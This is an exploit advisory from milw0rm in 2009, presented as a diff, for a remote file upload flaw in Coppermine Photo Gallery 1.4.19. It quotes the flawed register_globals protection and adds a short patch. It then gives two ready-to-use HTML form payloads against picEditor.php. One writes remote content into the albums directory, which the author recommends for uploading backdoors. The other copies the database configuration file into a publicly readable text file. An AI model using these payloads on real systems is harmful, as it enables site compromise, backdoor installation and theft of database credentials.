@@ -1,0 +1,92 @@
+Written By Michael Brooks
+Special thanks to str0ke!
+
+
+Coppermine Photo gallery - Remote PHP File Upload
+Affects: v1.4.19
+Homepage: http://coppermine-gallery.net/
+5,239,057   downloads from sf.net!
+
+For this attack we need register_globals=on .  The problem is that
+the anti-register_globals security can be bypassed.
+
+This is in /include/init.inc.php  starting on line 42:
+$keysToSkip = array('_POST', '_GET', '_COOKIE', '_REQUEST', '_SERVER', 'HTML_SUBST');
+//...
+        if (is_array($_POST)) {
+                foreach ($_POST as $key => $value) {
+                        if (!is_array($value))
+                                $_POST[$key] = strtr($value, $HTML_SUBST);
+                        if (!in_array($key, $keysToSkip) && isset($$key) && ini_get('register_globals') == '1') unset($$key);
+                }
+        }
+
+        if (is_array($_GET)) {
+                foreach ($_GET as $key => $value) {
+                        unset($_GET[$key]);
+                        $_GET[strtr(stripslashes($key), $HTML_SUBST)] = strtr(stripslashes($value), $HTML_SUBST);
+                        if (!in_array($key, $keysToSkip) && isset($$key) && ini_get('register_globals') == '1') unset($$key);
+                }
+        }
+
+        if (is_array($_COOKIE)) {
+                foreach ($_COOKIE as $key => $value) {
+                        if (!in_array($key, $keysToSkip) && isset($$key) && ini_get('register_globals') == '1') unset($$key);
+                }
+        }
+        if (is_array($_REQUEST)) {
+                foreach ($_REQUEST as $key => $value) {
+                        if (!is_array($value))
+                                $_REQUEST[$key] = strtr($value, $HTML_SUBST);
+                        if (!in_array($key, $keysToSkip) && isset($$key) && ini_get('register_globals') == '1') unset($$key);
+                }
+        }
+	//...
+	
+Here is a patch that will take care of register_globals.
+if(ini_get(register_globals)){
+	foreach(get_defined_vars() as $var=>$val){
+		//only keep superglobals we need on this whitelist,  _SESSION will take care of its self:
+		if(!in_array($var,array('_POST', '_GET', '_COOKIE', '_REQUEST', '_SERVER'))){
+			unset($$var);
+		}
+	}
+}
+
+
+These 2 exploits are written in HTM,   but they are NOT XSRF!  This is
+a global variable manipulation issue,  you can exploit this with CURL
+or whatever.
+
+This will copy www.google.com  to
+http://127.0.0.1/cpg1419/albums/test.php .  This is very useful for
+uploading backdoors.
+This is hijacking  a call to copy() so we need allow_url_fopen=On ,
+which is default.
+<html>
+	<form action="http://127.0.0.1/cpg1419/picEditor.php?img_dir=http%3A%2F%2Fwww.google.com&CURRENT_PIC[filename]=/test.php"
+method=post>
+		<input name="save" value=1>
+		<input name="keysToSkip" value=1>
+		<input name="_GET" value=1>
+		<input name="_REQUEST" value=1>
+		<input type=submit>
+	</form>
+</html>
+
+
+This request will copy the database connection info and make it readable here:
+http://10.1.1.155/Audit/cpg1419/albums/dbinfo.txt
+This attack works with allow_url_fopen=Off
+<html>
+	<form action="http://127.0.0.1/cpg1419/picEditor.php?img_dir=include/config.inc.php&CURRENT_PIC[filename]=/dbinfo.txt"
+method=post>
+		<input name="save" value=1>
+		<input name="keysToSkip" value=1>
+		<input name="_GET" value=1>
+		<input name="_REQUEST" value=1>
+		<input type=submit>
+	</form>
+</html>
+
+# milw0rm.com [2009-01-29]
